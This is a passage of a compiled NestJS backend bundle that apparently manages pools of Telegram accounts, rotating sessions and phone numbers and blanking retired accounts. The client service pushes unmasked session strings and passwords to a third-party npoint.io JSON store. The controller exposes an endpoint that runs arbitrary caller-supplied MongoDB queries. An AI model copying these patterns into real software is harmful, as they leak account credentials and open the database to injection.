/*!***********************************************************!*\
  !*** ./src/components/channels/dto/update-channel.dto.ts ***!
  \***********************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateChannelDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_channel_dto_1 = __webpack_require__(/*! ./create-channel.dto */ "./src/components/channels/dto/create-channel.dto.ts");
class UpdateChannelDto extends (0, swagger_1.PartialType)(create_channel_dto_1.CreateChannelDto) {
}
exports.UpdateChannelDto = UpdateChannelDto;


/***/ }),

/***/ "./src/components/channels/schemas/channel.schema.ts":
/*!***********************************************************!*\
  !*** ./src/components/channels/schemas/channel.schema.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ChannelSchema = exports.Channel = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose = __importStar(__webpack_require__(/*! mongoose */ "mongoose"));
let Channel = class Channel {
};
exports.Channel = Channel;
__decorate([
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], Channel.prototype, "channelId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], Channel.prototype, "broadcast", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: true }),
    __metadata("design:type", Boolean)
], Channel.prototype, "canSendMsgs", void 0);
__decorate([
    (0, mongoose_1.Prop)({ type: mongoose.Schema.Types.Number, default: 0 }),
    __metadata("design:type", Number)
], Channel.prototype, "participantsCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], Channel.prototype, "restricted", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], Channel.prototype, "sendMessages", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Channel.prototype, "title", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, default: null }),
    __metadata("design:type", String)
], Channel.prototype, "username", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, default: false }),
    __metadata("design:type", Boolean)
], Channel.prototype, "private", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false, required: false }),
    __metadata("design:type", Boolean)
], Channel.prototype, "forbidden", void 0);
exports.Channel = Channel = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'channels', versionKey: false, autoIndex: true, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], Channel);
exports.ChannelSchema = mongoose_1.SchemaFactory.createForClass(Channel);


/***/ }),

/***/ "./src/components/clients/client.controller.ts":
/*!*****************************************************!*\
  !*** ./src/components/clients/client.controller.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const client_service_1 = __webpack_require__(/*! ./client.service */ "./src/components/clients/client.service.ts");
const create_client_dto_1 = __webpack_require__(/*! ./dto/create-client.dto */ "./src/components/clients/dto/create-client.dto.ts");
const search_client_dto_1 = __webpack_require__(/*! ./dto/search-client.dto */ "./src/components/clients/dto/search-client.dto.ts");
const update_client_dto_1 = __webpack_require__(/*! ./dto/update-client.dto */ "./src/components/clients/dto/update-client.dto.ts");
let ClientController = class ClientController {
    constructor(clientService) {
        this.clientService = clientService;
    }
    async create(createClientDto) {
        try {
            return await this.clientService.create(createClientDto);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async search(query) {
        try {
            return await this.clientService.search(query);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async updateClient(clientId) {
        this.clientService.updateClient(clientId);
        return "Update client initiated";
    }
    async findAllMasked(query) {
        try {
            return await this.clientService.findAllMasked(query);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async findAll() {
        try {
            return await this.clientService.findAll();
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async findOne(clientId) {
        try {
            return await this.clientService.findOne(clientId);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
    async update(clientId, updateClientDto) {
        try {
            return await this.clientService.update(clientId, updateClientDto);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
    async remove(clientId) {
        try {
            return await this.clientService.remove(clientId);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
    async executeQuery(requestBody) {
        const { query, sort, limit, skip } = requestBody;
        try {
            return await this.clientService.executeQuery(query, sort, limit, skip);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async addPromoteMobile(clientId, mobileNumber) {
        try {
            return await this.clientService.addPromoteMobile(clientId, mobileNumber);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
    async removePromoteMobile(clientId, mobileNumber) {
        try {
            return await this.clientService.removePromoteMobile(clientId, mobileNumber);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
};
exports.ClientController = ClientController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data' }),
    (0, swagger_1.ApiResponse)({ status: 201, description: 'The user data has been successfully created.' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid input data.' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_client_dto_1.CreateClientDto]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search user data' }),
    (0, swagger_1.ApiQuery)({ name: 'clientId', required: false, description: 'Client ID' }),
    (0, swagger_1.ApiQuery)({ name: 'dbcoll', required: false, description: 'Database collection name' }),
    (0, swagger_1.ApiQuery)({ name: 'channelLink', required: false, description: 'Channel link' }),
    (0, swagger_1.ApiQuery)({ name: 'link', required: false, description: 'Client link' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Matching user data returned successfully.' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_client_dto_1.SearchClientDto]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "search", null);
__decorate([
    (0, common_1.Get)('updateClient/:clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "updateClient", null);
__decorate([
    (0, common_1.Get)('maskedCls'),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data with masked fields' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'All user data returned successfully.' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_client_dto_1.SearchClientDto]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "findAllMasked", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'All user data returned successfully.' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'User data returned successfully.' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'User data not found.' }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'The user data has been successfully updated.' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'User data not found.' }),
    __param(0, (0, common_1.Param)('clientId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_client_dto_1.UpdateClientDto]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'The user data has been successfully deleted.' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'User data not found.' }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Query executed successfully.' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid query.' }),
    (0, swagger_1.ApiBody)({ schema: { properties: { query: { type: 'object' }, sort: { type: 'object' }, limit: { type: 'number' }, skip: { type: 'number' } } } }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "executeQuery", null);
__decorate([
    (0, common_1.Patch)(':clientId/promoteMobile/add'),
    (0, swagger_1.ApiOperation)({ summary: 'Add a mobile number to the promoteMobile array for a specific client' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'The unique identifier of the client' }),
    (0, swagger_1.ApiBody)({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Mobile number added successfully.' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Client not found.' }),
    __param(0, (0, common_1.Param)('clientId')),
    __param(1, (0, common_1.Body)('mobileNumber')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "addPromoteMobile", null);
__decorate([
    (0, common_1.Patch)(':clientId/promoteMobile/remove'),
    (0, swagger_1.ApiOperation)({ summary: 'Remove a mobile number from the promoteMobile array for a specific client' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'The unique identifier of the client' }),
    (0, swagger_1.ApiBody)({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Mobile number removed successfully.' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Client not found.' }),
    __param(0, (0, common_1.Param)('clientId')),
    __param(1, (0, common_1.Body)('mobileNumber')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "removePromoteMobile", null);
exports.ClientController = ClientController = __decorate([
    (0, swagger_1.ApiTags)('Clients'),
    (0, common_1.Controller)('clients'),
    __metadata("design:paramtypes", [client_service_1.ClientService])
], ClientController);


/***/ }),

/***/ "./src/components/clients/client.module.ts":
/*!*************************************************!*\
  !*** ./src/components/clients/client.module.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const client_schema_1 = __webpack_require__(/*! ./schemas/client.schema */ "./src/components/clients/schemas/client.schema.ts");
const client_service_1 = __webpack_require__(/*! ./client.service */ "./src/components/clients/client.service.ts");
const client_controller_1 = __webpack_require__(/*! ./client.controller */ "./src/components/clients/client.controller.ts");
const Telegram_module_1 = __webpack_require__(/*! ../Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const buffer_client_module_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.module */ "./src/components/buffer-clients/buffer-client.module.ts");
const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./src/components/users/users.module.ts");
const archived_client_module_1 = __webpack_require__(/*! ../archived-clients/archived-client.module */ "./src/components/archived-clients/archived-client.module.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const npoint_module_1 = __webpack_require__(/*! ../n-point/npoint.module */ "./src/components/n-point/npoint.module.ts");
const timestamp_module_1 = __webpack_require__(/*! ../timestamps/timestamp.module */ "./src/components/timestamps/timestamp.module.ts");
let ClientModule = class ClientModule {
};
exports.ClientModule = ClientModule;
exports.ClientModule = ClientModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: client_schema_1.Client.name, schema: client_schema_1.ClientSchema }]),
            (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
            (0, common_1.forwardRef)(() => buffer_client_module_1.BufferClientModule),
            (0, common_1.forwardRef)(() => users_module_1.UsersModule),
            (0, common_1.forwardRef)(() => archived_client_module_1.ArchivedClientModule),
            (0, common_1.forwardRef)(() => timestamp_module_1.TimestampModule),
            npoint_module_1.NpointModule
        ],
        controllers: [client_controller_1.ClientController],
        providers: [client_service_1.ClientService],
        exports: [client_service_1.ClientService]
    })
], ClientModule);


/***/ }),

/***/ "./src/components/clients/client.service.ts":
/*!**************************************************!*\
  !*** ./src/components/clients/client.service.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientService = void 0;
const Telegram_service_1 = __webpack_require__(/*! ./../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const client_schema_1 = __webpack_require__(/*! ./schemas/client.schema */ "./src/components/clients/schemas/client.schema.ts");
const buffer_client_service_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.service */ "./src/components/buffer-clients/buffer-client.service.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./src/components/users/users.service.ts");
const archived_client_service_1 = __webpack_require__(/*! ../archived-clients/archived-client.service */ "./src/components/archived-clients/archived-client.service.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
const path = __importStar(__webpack_require__(/*! path */ "path"));
const cloudinary_1 = __webpack_require__(/*! ../../cloudinary */ "./src/cloudinary.ts");
const npoint_service_1 = __webpack_require__(/*! ../n-point/npoint.service */ "./src/components/n-point/npoint.service.ts");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
let settingupClient = Date.now() - 250000;
let ClientService = class ClientService {
    constructor(clientModel, telegramService, bufferClientService, usersService, archivedClientService, npointSerive) {
        this.clientModel = clientModel;
        this.telegramService = telegramService;
        this.bufferClientService = bufferClientService;
        this.usersService = usersService;
        this.archivedClientService = archivedClientService;
        this.npointSerive = npointSerive;
        this.clientsMap = new Map();
        this.lastUpdateMap = new Map();
        setInterval(async () => {
            await this.refreshMap();
        }, 5 * 60 * 1000);
    }
    async checkNpoint() {
        const clients = (await axios_1.default.get('https://api.npoint.io/7c2682f37bb93ef486ba')).data;
        for (const client in clients) {
            const existingClient = await this.findOne(client, false);
            if ((0, utils_1.areJsonsNotSame)(existingClient, clients[client])) {
                await this.findAll();
                const clientData = (0, utils_1.mapToJson)(this.clientsMap);
                await this.npointSerive.updateDocument("7c2682f37bb93ef486ba", clientData);
                const maskedCls = {};
                for (const client in clientData) {
                    const { session, mobile, password, promoteMobile, ...maskedClient } = clientData[client];
                    maskedCls[client] = maskedClient;
                }
                await this.npointSerive.updateDocument("f0d1e44d82893490bbde", maskedCls);
                break;
            }
        }
    }
    async create(createClientDto) {
        const createdUser = new this.clientModel(createClientDto);
        return createdUser.save();
    }
    async findAll() {
        const clientMapLength = this.clientsMap.size;
        if (clientMapLength < 20) {
            const results = await this.clientModel.find({}, { _id: 0, updatedAt: 0 }).lean();
            for (const client of results) {
                this.clientsMap.set(client.clientId, client);
            }
            console.log("Refreshed Clients");
            return results;
        }
        else {
            return Array.from(this.clientsMap.values());
        }
    }
    async findAllMasked(query) {
        const allClients = await this.findAll();
        const filteredClients = query
            ? allClients.filter(client => {
                return Object.keys(query).every(key => client[key] === query[key]);
            })
            : allClients;
        const results = filteredClients.map(client => {
            const { session, mobile, password, promoteMobile, ...maskedClient } = client;
            return maskedClient;
        });
        return results;
    }
    async refreshMap() {
        console.log("Refreshed Clients");
        this.clientsMap.clear();
    }
    async findOne(clientId, throwErr = true) {
        const client = this.clientsMap.get(clientId);
        if (client) {
            return client;
        }
        else {
            const user = await this.clientModel.findOne({ clientId }, { _id: 0, updatedAt: 0 }).lean().exec();
            this.clientsMap.set(clientId, user);
            if (!user && throwErr) {
                throw new common_1.NotFoundException(`Client with ID "${clientId}" not found`);
            }
            return user;
        }
    }
    async update(clientId, updateClientDto) {
        delete updateClientDto['_id'];
        if (updateClientDto._doc) {
            delete updateClientDto._doc['_id'];
        }
        await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Updating the Existing client: ${clientId}`);
        const updatedUser = await this.clientModel.findOneAndUpdate({ clientId }, { $set: updateClientDto }, { new: true, upsert: true }).exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`Client with ID "${clientId}" not found`);
        }
        this.clientsMap.set(clientId, updatedUser);
        await (0, fetchWithTimeout_1.fetchWithTimeout)(`${process.env.uptimeChecker}/refreshmap`);
        await (0, fetchWithTimeout_1.fetchWithTimeout)(`${process.env.uptimebot}/refreshmap`);
        console.log("Refreshed Maps");
        return updatedUser;
    }
    async remove(clientId) {
        const deletedUser = await this.clientModel.findOneAndDelete({ clientId }).exec();
        if (!deletedUser) {
            throw new common_1.NotFoundException(`Client with ID "${clientId}" not found`);
        }
        return deletedUser;
    }
    async search(filter) {
        console.log(filter);
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        console.log(filter);
        return this.clientModel.find(filter).exec();
    }
    async setupClient(clientId, setupClientQueryDto) {
        console.log(`Received New Client Request for - ${clientId}`, settingupClient);
        if ((0, utils_1.toBoolean)(process.env.AUTO_CLIENT_SETUP) && Date.now() > (settingupClient + 240000)) {
            settingupClient = Date.now();
            const existingClient = await this.findOne(clientId);
            const existingClientMobile = existingClient.mobile;
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Received New Client Request for - ${clientId} - OldNumber: ${existingClient.mobile} || ${existingClient.username}`);
            console.log(setupClientQueryDto);
            await connection_manager_1.connectionManager.disconnectAll();
            const today = (new Date(Date.now())).toISOString().split('T')[0];
            const query = { availableDate: { $lte: today }, channels: { $gt: 200 } };
            const newBufferClient = (await this.bufferClientService.executeQuery(query, { tgId: 1 }))[0];
            try {
                if (newBufferClient) {
                    this.telegramService.setActiveClientSetup({ ...setupClientQueryDto, clientId, existingMobile: existingClientMobile, newMobile: newBufferClient.mobile });
                    await connection_manager_1.connectionManager.getClient(newBufferClient.mobile);
                    const newSession = await this.telegramService.createNewSession(newBufferClient.mobile);
                    await this.updateClientSession(newSession);
                }
                else {
                    await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Buffer Clients not available`);
                    console.log("Buffer Clients not available");
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
                console.log("Removing buffer as error");
                const availableDate = (new Date(Date.now() + (3 * 24 * 60 * 60 * 1000))).toISOString().split('T')[0];
                await this.bufferClientService.createOrUpdate(newBufferClient.mobile, { availableDate });
                this.telegramService.setActiveClientSetup(undefined);
            }
            finally {
                await connection_manager_1.connectionManager.unregisterClient(newBufferClient.mobile);
            }
        }
        else {
            console.log("Profile Setup Recently tried, wait ::", settingupClient - Date.now());
        }
    }
    async updateClientSession(newSession) {
        try {
            let updatedUsername = '';
            console.log("Updating Client Session");
            const setup = this.telegramService.getActiveClientSetup();
            const { days, archiveOld, clientId, existingMobile, formalities, newMobile } = setup;
            await connection_manager_1.connectionManager.disconnectAll();
            await (0, Helpers_1.sleep)(2000);
            const client = await this.findOne(clientId);
            await connection_manager_1.connectionManager.getClient(newMobile, { handler: true, autoDisconnect: false });
            const firstName = (client.name).split(' ')[0];
            const middleName = (client.name).split(' ')[1];
            const firstNameCaps = firstName[0].toUpperCase() + firstName.slice(1);
            const middleNameCaps = middleName ? middleName[0].toUpperCase() + middleName.slice(1) : '';
            const baseUsername = `${firstNameCaps}_${middleNameCaps.slice(0, 3)}` + (0, utils_1.fetchNumbersFromString)(clientId);
            try {
                updatedUsername = await this.telegramService.updateUsername(newMobile, baseUsername);
            }
            catch (error) {
                (0, parseError_1.parseError)(error, 'Error in updating username', true);
            }
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Updated username for NewNumber:${newMobile} || ${updatedUsername}`);
            await connection_manager_1.connectionManager.unregisterClient(newMobile);
            const existingClientUser = (await this.usersService.search({ mobile: existingMobile }))[0];
            const existingClient = await this.findOne(clientId);
            await this.update(clientId, { mobile: newMobile, username: updatedUsername, session: newSession });
            await (0, fetchWithTimeout_1.fetchWithTimeout)(existingClient.deployKey, {}, 1);
            await this.bufferClientService.remove(newMobile);
            setTimeout(async () => {
                await this.updateClient(clientId);
            }, 15000);
            try {
                if (existingClientUser) {
                    try {
                        if ((0, utils_1.toBoolean)(formalities)) {
                            await connection_manager_1.connectionManager.getClient(existingMobile, { handler: true, autoDisconnect: false });
                            console.log("Started Formalities");
                            await this.telegramService.updateNameandBio(existingMobile, 'Deleted Account', `New Acc: @${updatedUsername}`);
                            await this.telegramService.deleteProfilePhotos(existingMobile);
                            await this.telegramService.updateUsername(existingMobile, '');
                            await this.telegramService.updatePrivacyforDeletedAccount(existingMobile);
                            console.log("Formalities finished");
                            await connection_manager_1.connectionManager.unregisterClient(existingMobile);
                            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Formalities finished`);
                        }
                        else {
                            console.log("Formalities skipped");
                        }
                        if (archiveOld) {
                            const availableDate = (new Date(Date.now() + ((days + 1) * 24 * 60 * 60 * 1000))).toISOString().split('T')[0];
                            const bufferClientDto = {
                                mobile: existingMobile,
                                availableDate,
                                session: existingClientUser.session,
                                tgId: existingClientUser.tgId,
                                channels: 170
                            };
                            const updatedBufferClient = await this.bufferClientService.createOrUpdate(existingMobile, bufferClientDto);
                            console.log("client Archived: ", updatedBufferClient);
                            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Client Archived`);
                        }
                        else {
                            console.log("Client Archive Skipped");
                            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Client Archive Skipped`);
                        }
                    }
                    catch (error) {
                        console.log("Cannot Archive Old Client");
                        const errorDetails = (0, parseError_1.parseError)(error, 'Error in Archiving Old Client', true);
                        if ((0, utils_1.contains)(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', "session_revoked", "user_deactivated_ban"])) {
                            console.log("Deleting User: ", existingClientUser.mobile);
